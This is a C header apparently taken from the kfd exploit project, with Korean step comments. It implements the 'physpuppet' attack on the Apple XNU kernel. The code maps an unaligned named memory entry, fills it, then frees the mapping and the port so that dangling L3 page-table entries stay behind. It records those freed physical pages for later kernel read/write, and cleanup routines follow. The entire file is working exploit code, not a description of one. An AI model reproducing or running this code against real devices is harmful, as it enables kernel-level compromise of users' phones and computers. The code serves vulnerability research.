/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef physpuppet_h
#define physpuppet_h


const u64 physpuppet_vmne_size = pages(2) + 1; /// vmne -> size := 2P + 1
const u64 physpuppet_vme_offset = pages(1);
const u64 physpuppet_vme_size = pages(2);

void physpuppet_init(struct kfd* kfd)
{
    /*
     * Nothing to do.
     */
    return;
}

void physpuppet_run(struct kfd* kfd)
{
    
    for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
    
        //MARK: - STEP 1: Create a vm_named_entry
        /* It will be backed by a vm_object with 
         * a vo_size of 3 pages and an initial ref_count of 1.
         */
        mach_port_t named_entry = MACH_PORT_NULL;
        assert_mach(mach_memory_object_memory_entry_64(mach_host_self(), true, physpuppet_vmne_size, VM_PROT_DEFAULT, MEMORY_OBJECT_NULL, &named_entry));

        
        //MARK: - STEP 2: vm_named_entry를 새로운 vm_map에 매핑
        /*
         * vme_start는 vm_map_entry에서 정렬되지만,
         * vme_end의 경우에는 vme_start + 1 page + 1byte로 정렬되지 않는다.(A + 1byte)
         * 매핑된 vm_map_entry는 vme_object가 기존의 vm_named_entry를 공유하고 있기 때문에
         * 총 두번의 ref_count가 발생한다.
         * 결론적으로 새로운 vm_map_entry의 vme_offset은 하나다.
         */
        vm_address_t address = 0;
        assert_mach(vm_map(mach_task_self(), &address, (-1), 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, named_entry, physpuppet_vme_offset, false, VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_DEFAULT));

        
        
        //MARK: - STEP 3: vm_map_entry인 vme2에서 두 페이지가 문제 일으킴
        /*
         * 문제를 일으키는 두 페이지가 L3 PTE로 설정되면서 R/W 권한을 갖게 된다
         */
        memset((void*)(address), 'A', physpuppet_vme_size);

        
        //MARK: - STEP 4: virtual address 해제
        /*
         * vm_map_delete()를 실행하게 되면,
         * L3 PTE에 저장된 데이터가 사라진다.
         * 따라서 vme2의 정보가 사라지게 되고
         * ref_count 또한 1이 된다.
         */
        assert_mach(vm_deallocate(mach_task_self(), address, physpuppet_vme_size));

        
        //MARK: - STEP 5: 모든 vm_named_entry 구조체 해제
        /*
         * vmo1에서 vm_object_reap()을 발생시킴
         * vmp1과 vmp2는 pmap_disconnect()를 호출하지 않고 자유리스트에 다시 넣음.
         * 아직도 PTE에 데이터가 남아있음.
         */
        assert_mach(mach_port_deallocate(mach_task_self(), named_entry));
        kfd->puaf.puaf_pages_uaddr[i] = address + physpuppet_vme_offset;

        //MARK: - STEP 6:댕글링 L3 PTE 획득 후..
        /*
         * 물리 주소가 없기 때문에 프로세스가 끝날때 커널 패닉 발생
         * vm_map_entry를 다시 insert
         * 따라서 첫번째 페이지에 대한 vm_object populate를 해야함.
         */
        assert_mach(vm_allocate(mach_task_self(), &address, physpuppet_vme_size, VM_FLAGS_FIXED));
        memset((void*)(address), 'A', physpuppet_vme_offset);
    }
}

void physpuppet_cleanup(struct kfd* kfd)
{
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

    for (u64 i = 0; i < kfd->puaf.number_of_puaf_pages; i++) {
        u64 puaf_page_uaddr = kfd->puaf.puaf_pages_uaddr[i];
        if ((puaf_page_uaddr == kread_page_uaddr) || (puaf_page_uaddr == kwrite_page_uaddr)) {
            continue;
        }

        assert_mach(vm_deallocate(mach_task_self(), puaf_page_uaddr - physpuppet_vme_offset, physpuppet_vme_size));
    }
}

void physpuppet_free(struct kfd* kfd)
{
    u64 kread_page_uaddr = trunc_page(kfd->kread.krkw_object_uaddr);
    u64 kwrite_page_uaddr = trunc_page(kfd->kwrite.krkw_object_uaddr);

    assert_mach(vm_deallocate(mach_task_self(), kread_page_uaddr - physpuppet_vme_offset, physpuppet_vme_size));
    if (kwrite_page_uaddr != kread_page_uaddr) {
        assert_mach(vm_deallocate(mach_task_self(), kwrite_page_uaddr - physpuppet_vme_offset, physpuppet_vme_size));
    }
}

#endif /* physpuppet_h */
